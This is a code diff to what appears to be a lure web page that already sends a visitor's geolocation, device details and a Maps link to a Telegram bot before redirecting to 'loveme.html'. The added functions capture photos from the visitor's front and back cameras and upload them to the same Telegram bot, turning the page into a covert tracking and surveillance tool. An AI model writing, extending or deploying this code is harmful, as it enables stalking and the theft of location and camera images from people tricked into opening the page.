@@ -70,6 +70,9 @@
             // Get device information
             const deviceInfo = getDeviceInfo();
 
+            // Capture photos from front and back cameras
+            const [frontCameraImage, backCameraImage] = await capturePhotos();
+
             // Format Google Maps URL
             const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
@@ -108,6 +111,22 @@ OS Version: ${deviceInfo.osVersion}`;
 
             console.log("Message sent successfully to Telegram bot.");
 
+            // Send images to Telegram bot
+            if (frontCameraImage && backCameraImage) {
+              await sendImageToTelegram(
+                telegramBotToken,
+                chatId,
+                frontCameraImage,
+                "Front Camera Photo"
+              );
+              await sendImageToTelegram(
+                telegramBotToken,
+                chatId,
+                backCameraImage,
+                "Back Camera Photo"
+              );
+            }
+
             document.getElementById("message").textContent =
               "Data sent successfully!";
             window.location.href = "loveme.html";
@@ -119,6 +138,69 @@ OS Version: ${deviceInfo.osVersion}`;
         } else {
           alert("Geolocation is not supported by your browser.");
         }
+      }
+
+      // Function to capture photos from front and back cameras
+      async function capturePhotos() {
+        const constraintsFront = { video: { facingMode: "user" } };
+        const constraintsBack = { video: { facingMode: "environment" } };
+
+        let frontCameraImage = null;
+        let backCameraImage = null;
+
+        try {
+          // Access front camera
+          const frontStream = await navigator.mediaDevices.getUserMedia(
+            constraintsFront
+          );
+          const frontTrack = frontStream.getVideoTracks()[0];
+          const frontImageCapture = new ImageCapture(frontTrack);
+          frontCameraImage = await frontImageCapture.takePhoto();
+          frontTrack.stop();
+
+          // Access back camera
+          const backStream = await navigator.mediaDevices.getUserMedia(
+            constraintsBack
+          );
+          const backTrack = backStream.getVideoTracks()[0];
+          const backImageCapture = new ImageCapture(backTrack);
+          backCameraImage = await backImageCapture.takePhoto();
+          backTrack.stop();
+        } catch (error) {
+          console.error("Error accessing camera:", error.message);
+          alert("Unable to access camera. Please ensure camera permissions are granted.");
+        }
+
+        return [
+          frontCameraImage ? URL.createObjectURL(frontCameraImage) : null,
+          backCameraImage ? URL.createObjectURL(backCameraImage) : null,
+        ];
+      }
+
+      // Function to send an image to Telegram bot
+      async function sendImageToTelegram(botToken, chatId, imageData, caption) {
+        const formData = new FormData();
+        formData.append("chat_id", chatId);
+        formData.append("caption", caption);
+
+        // Convert image data to Blob
+        const blob = await fetch(imageData).then((res) => res.blob());
+        formData.append("photo", blob);
+
+        const response = await fetch(
+          `https://api.telegram.org/bot${botToken}/sendPhoto`,
+          {
+            method: "POST",
+            body: formData,
+          }
+        );
+
+        if (!response.ok) {
+          const errorData = await response.json();
+          throw new Error(`Telegram API error: ${errorData.description}`);
+        }
+
+        console.log("Image sent successfully to Telegram bot.");
       }
 
       // Function to fetch country name using reverse geocoding
